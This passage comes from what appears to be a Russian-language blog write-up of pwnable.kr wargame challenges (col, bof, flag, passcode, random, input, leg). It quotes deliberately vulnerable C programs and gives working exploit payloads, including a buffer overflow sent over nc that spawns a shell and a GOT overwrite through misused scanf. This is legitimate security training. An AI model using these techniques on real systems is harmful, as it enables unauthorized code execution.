  <span class="p">}</span>
  <span class="k">else</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"wrong passcode.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Вводится 20 символов, рабиваем их по 4: <code class="language-plaintext highlighter-rouge">AAAA AAAA AAAA AAAA AAAA</code></p>

<p>Суммируем, равенство должно выполняться:</p>

<p><code class="language-plaintext highlighter-rouge">0x41414141 + 0x41414141 + 0x41414141 + 0x41414141 + 0x41414141 = 0x21DD09EC</code></p>

<p>Подгоняем числа, выходит:</p>

<p><code class="language-plaintext highlighter-rouge">0x6c5cec8 + 0x6c5cec8 + 0x6c5cec8 + 0x6c5cec8 + 0x6c5cecc</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./col <span class="si">$(</span>python <span class="nt">-c</span> <span class="s2">"print('</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">c5</span><span class="se">\x</span><span class="s2">06' * 4 + '</span><span class="se">\x</span><span class="s2">cc</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">c5</span><span class="se">\x</span><span class="s2">06')"</span><span class="si">)</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">daddy! I just managed to create a hash collision :)</code></p>

<h1 id="bof"><a href="#header-1"></a>bof</h1>

<blockquote>
  <p>Nana told me that buffer overflow is one of the most common software vulnerability.
Is that true? Download: http://pwnable.kr/bin/bof</p>

  <p>Download: http://pwnable.kr/bin/bof.c</p>

  <p>Running at : nc pwnable.kr 9000</p>
</blockquote>

<p><strong>bof.c</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">int</span> <span class="n">key</span><span class="p">){</span>
  <span class="kt">char</span> <span class="n">overflowme</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"overflow me : "</span><span class="p">);</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">overflowme</span><span class="p">);</span> <span class="c1">// smash me!</span>
  <span class="k">if</span><span class="p">(</span><span class="n">key</span> <span class="o">==</span> <span class="mh">0xcafebabe</span><span class="p">){</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span><span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Nah..</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
  <span class="n">func</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Нужно перезаписать переменную на 0xcafebabe, находим в дебаггере правильный офсет, засылаем байты, cat’ом не даём stdout закрыться</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>python <span class="nt">-c</span> “print<span class="o">(</span><span class="s1">'A'</span><span class="k">*</span>52 + <span class="s1">'\xbe\xba\xfe\xca'</span><span class="o">)</span><span class="s2">"; cat) | nc pwnable.kr 9000
</span></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">daddy, I just pwned a buFFer :)</code></p>

<h1 id="flag"><a href="#header-1"></a>flag</h1>

<blockquote>
  <p>Papa brought me a packed present! let’s open it.</p>

  <p>Download: http://pwnable.kr/bin/flag</p>

  <p>This is reversing task. all you need is binary</p>
</blockquote>

<p>strings flag</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PROT_EXEC|PROT_WRITE failed.
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.08 Copyright © 1996-2011 the UPX Team. All Rights Reserved. $
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">.\upx.exe -d .\flag</code></p>

<p><code class="language-plaintext highlighter-rouge">UPX…? sounds like a delivery service :)</code></p>

<h1 id="passcode"><a href="#header-1"></a>passcode</h1>

<blockquote>
  <p>Mommy told me to make a passcode based login system.</p>

  <p>My initial C code was compiled without any error!</p>

  <p>Well, there was some compiler warning, but who cares about that?</p>

  <p>ssh passcode@pwnable.kr -p2222 (pw:guest)</p>
</blockquote>

<p><strong>passcode.c</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">login</span><span class="p">(){</span>
        <span class="kt">int</span> <span class="n">passcode1</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">passcode2</span><span class="p">;</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"enter passcode1 : "</span><span class="p">);</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="n">passcode1</span><span class="p">);</span>
        <span class="n">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>

        <span class="c1">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"enter passcode2 : "</span><span class="p">);</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="n">passcode2</span><span class="p">);</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"checking...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">passcode1</span><span class="o">==</span><span class="mi">338150</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">passcode2</span><span class="o">==</span><span class="mi">13371337</span><span class="p">){</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"Login OK!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">system</span><span class="p">(</span><span class="s">"/bin/cat flag"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span><span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"Login Failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">welcome</span><span class="p">(){</span>
        <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"enter you name : "</span><span class="p">);</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">"%100s"</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Welcome %s!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Toddler's Secure Login System 1.0 beta.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

        <span class="n">welcome</span><span class="p">();</span>
        <span class="n">login</span><span class="p">();</span>

        <span class="c1">// something after login...</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Now I can safely trust you that you have credential :)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Отсутствие форматных символов в scanf’ах позволяет передать туда адреса и записать по ним, что нам нужно</p>

<p>Где находятся переменные:</p>

<p><code class="language-plaintext highlighter-rouge">name: [ebp-0x70]
passcode1: [ebp-0x10]
passcode2: [ebp-0xc]
</code></p>

<p>Но: char name[100]. passcode1 и passcode2 инты, каждый занимает 4 байта</p>

<p>Считаем оффсет, passcode1 - name = 0x70 - 0x10 = 0x60 = 96 байт</p>

<p>passcode1 занимает последние 4 байта массива name</p>

<ul>
  <li>Заполняем массив до конца</li>
  <li>В последних 4-ёх байтах передаём адрес функции fflush из GOT - 0x0804a004</li>
  <li>scanf’ом в функции login перезаписываем адрес fflush в GOT на код, когда уже проверки прошли и функцией system вызывается cat - 0x080485e3 (передаём его в десятичной 134514147)</li>
  <li>При вызове fflush исполнение перейдёт на нужную нам часть листинга</li>
</ul>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">gdb</span><span class="o">-</span><span class="nx">peda$</span> <span class="nx">x</span><span class="o">/</span><span class="nx">x</span> <span class="mh">0x0804a004</span>
<span class="mh">0x804a004</span> <span class="o">&lt;</span><span class="nx">fflush</span><span class="p">@</span><span class="nd">got</span><span class="p">.</span><span class="nx">plt</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x08048436</span>

<span class="nx">gdb</span><span class="o">-</span><span class="nx">peda$</span> <span class="nx">x</span><span class="o">/</span><span class="nx">x</span> <span class="mh">0x0804a004</span>
<span class="mh">0x804a004</span> <span class="o">&lt;</span><span class="nx">fflush</span><span class="p">@</span><span class="nd">got</span><span class="p">.</span><span class="nx">plt</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x080485e3</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">01'*96 + '</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">a0</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '134514147'"</span> | ./passcode
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Sorry mom… I got confused about scanf usage :(</code></p>

<h1 id="random"><a href="#header-1"></a>random</h1>

<blockquote>
  <p>Daddy, teach me how to use random value in programming!</p>

  <p>ssh random@pwnable.kr -p2222 (pw:guest)</p>
</blockquote>

<p><strong>random.c</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">random</span><span class="p">;</span>
        <span class="n">random</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>        <span class="c1">// random value!</span>

        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">key</span><span class="p">);</span>

        <span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="n">key</span> <span class="o">^</span> <span class="n">random</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span> <span class="p">){</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"Good!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">system</span><span class="p">(</span><span class="s">"/bin/cat flag"</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"Wrong, maybe you should try 2^32 cases.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Не инициализирован сид для рандома (srand)</p>

<p>Первое значение рандома в си без инициализации - 0x6b8b4567</p>

<p>key ^ 0x6b8b4567 == 0xdeadbeef –&gt; 0x6b8b4567 ^ 0xdeadbeef == 0xb526fb88 == 3039230856</p>

<p>Передаём в прогу это число 3039230856</p>

<p><code class="language-plaintext highlighter-rouge">random@pwnable:~$ echo -ne "3039230856" | ./random</code></p>

<blockquote>
  <p>Good!</p>

  <p>Mommy, I thought libc random is unpredictable…</p>
</blockquote>

<h1 id="input"><a href="#header-1"></a>input</h1>

<blockquote>
  <p>Mom? how can I pass my input to a computer program?</p>

  <p>ssh input2@pwnable.kr -p2222 (pw:guest)</p>
</blockquote>

<p><strong>input.c</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[]){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Welcome to pwnable.kr</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Let's see if you know how to give input to program</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Just give me correct inputs then you will get the flag :)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

        <span class="c1">// argv</span>
        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">100</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="sc">'A'</span><span class="p">],</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="sc">'B'</span><span class="p">],</span><span class="s">"</span><span class="se">\x20\x0a\x0d</span><span class="s">"</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Stage 1 clear!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

        <span class="c1">// stdio</span>
        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00\x0a\x00\xff</span><span class="s">"</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">read</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00\x0a\x02\xff</span><span class="s">"</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Stage 2 clear!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

        <span class="c1">// env</span>
        <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="s">"</span><span class="se">\xca\xfe\xba\xbe</span><span class="s">"</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"</span><span class="se">\xde\xad\xbe\xef</span><span class="s">"</span><span class="p">)))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Stage 3 clear!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

        <span class="c1">// file</span>
        <span class="kt">FILE</span><span class="o">*</span> <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"</span><span class="se">\x0a</span><span class="s">"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span> <span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span><span class="o">!=</span><span class="mi">1</span> <span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span> <span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00\x00\x00\x00</span><span class="s">"</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Stage 4 clear!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

        <span class="c1">// network</span>
        <span class="kt">int</span> <span class="n">sd</span><span class="p">,</span> <span class="n">cd</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">saddr</span><span class="p">,</span> <span class="n">caddr</span><span class="p">;</span>
        <span class="n">sd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">sd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"socket error, tell admin</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">saddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
        <span class="n">saddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
        <span class="n">saddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="sc">'C'</span><span class="p">])</span> <span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">saddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">saddr</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"bind error, use another port</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">listen</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
        <span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">);</span>
        <span class="n">cd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">caddr</span><span class="p">,</span> <span class="p">(</span><span class="n">socklen_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">c</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">cd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"accept error, tell admin</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span> <span class="n">recv</span><span class="p">(</span><span class="n">cd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span> <span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"</span><span class="se">\xde\xad\xbe\xef</span><span class="s">"</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Stage 5 clear!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

        <span class="c1">// here's your flag</span>
        <span class="n">system</span><span class="p">(</span><span class="s">"/bin/cat flag"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>python2</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">subprocess</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">socket</span>
<span class="kn">import</span> <span class="n">time</span>

<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">ln -s /home/input2/flag /tmp/tests4/flag</span><span class="sh">"</span><span class="p">)</span>

<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/tmp/tests4/</span><span class="se">\x0a</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="se">\x00\x00\x00\x00</span><span class="sh">"</span><span class="p">)</span>

<span class="n">stdin_r</span><span class="p">,</span> <span class="n">stdin_w</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">pipe</span><span class="p">()</span>
<span class="n">stderr_r</span><span class="p">,</span> <span class="n">stderr_w</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">pipe</span><span class="p">()</span>

<span class="n">args</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">X</span><span class="sh">'</span><span class="p">]</span> <span class="o">*</span> <span class="mi">99</span>
<span class="n">args</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="sh">''</span>
<span class="n">args</span><span class="p">[</span><span class="mi">65</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\x20\x0A\x0D</span><span class="sh">"</span>
<span class="n">args</span><span class="p">[</span><span class="mi">66</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">65005</span><span class="sh">"</span>

<span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nc">Popen</span><span class="p">([</span><span class="sh">"</span><span class="s">/home/input2/input</span><span class="sh">"</span><span class="p">]</span> <span class="o">+</span> <span class="n">args</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">stdin_r</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">stderr_r</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="se">\xDE\xAD\xBE\xEF</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="se">\xCA\xFE\xBA\xBE</span><span class="sh">"</span><span class="p">},</span> <span class="n">cwd</span><span class="o">=</span><span class="sh">"</span><span class="s">/tmp/tests4/</span><span class="sh">"</span><span class="p">)</span>

<span class="n">os</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">stdin_w</span><span class="p">,</span> <span class="sh">"</span><span class="se">\x00\x0A\x00\xFF</span><span class="sh">"</span><span class="p">)</span>
<span class="n">os</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">stderr_w</span><span class="p">,</span> <span class="sh">"</span><span class="se">\x00\x0A\x02\xFF</span><span class="sh">"</span><span class="p">)</span>

<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">localhost</span><span class="sh">"</span><span class="p">,</span> <span class="mi">65005</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="sh">'</span><span class="se">\xDE\xAD\xBE\xEF</span><span class="sh">'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Mommy! I learned how to pass various input in Linux :)</code></p>

<p><a href="https://stroobants.dev/pwnablekr-series-input.htmlhttps://stroobants.dev/pwnablekr-series-input.html">stroobants.dev/pwnablekr-series-input.html</a></p>

<h1 id="leg"><a href="#header-1"></a>leg</h1>

<blockquote>
  <p>Daddy told me I should study arm.</p>

  <p>But I prefer to study my leg!</p>

  <p>Download: http://pwnable.kr/bin/leg.c</p>

  <p>Download: http://pwnable.kr/bin/leg.asm</p>

  <p>ssh leg@pwnable.kr -p2222 (pw:guest)</p>
</blockquote>

<p><strong>leg.c</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">key1</span><span class="p">(){</span>
  <span class="n">asm</span><span class="p">(</span><span class="s">"mov r3, pc</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">key2</span><span class="p">(){</span>
  <span class="n">asm</span><span class="p">(</span>
  <span class="s">"push {r6}</span><span class="se">\n</span><span class="s">"</span>
  <span class="s">"add  r6, pc, $1</span><span class="se">\n</span><span class="s">"</span>
  <span class="s">"bx r6</span><span class="se">\n</span><span class="s">"</span>
  <span class="s">".code   16</span><span class="se">\n</span><span class="s">"</span>
  <span class="s">"mov  r3, pc</span><span class="se">\n</span><span class="s">"</span>
  <span class="s">"add  r3, $0x4</span><span class="se">\n</span><span class="s">"</span>
  <span class="s">"push {r3}</span><span class="se">\n</span><span class="s">"</span>
  <span class="s">"pop  {pc}</span><span class="se">\n</span><span class="s">"</span>
  <span class="s">".code  32</span><span class="se">\n</span><span class="s">"</span>
  <span class="s">"pop  {r6}</span><span class="se">\n</span><span class="s">"</span>
  <span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">key3</span><span class="p">(){</span>
  <span class="n">asm</span><span class="p">(</span><span class="s">"mov r3, lr</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
  <span class="kt">int</span> <span class="n">key</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Daddy has very strong arm! : "</span><span class="p">);</span>
  <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="n">key1</span><span class="p">()</span><span class="o">+</span><span class="n">key2</span><span class="p">()</span><span class="o">+</span><span class="n">key3</span><span class="p">())</span> <span class="o">==</span> <span class="n">key</span> <span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Congratz!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"flag"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
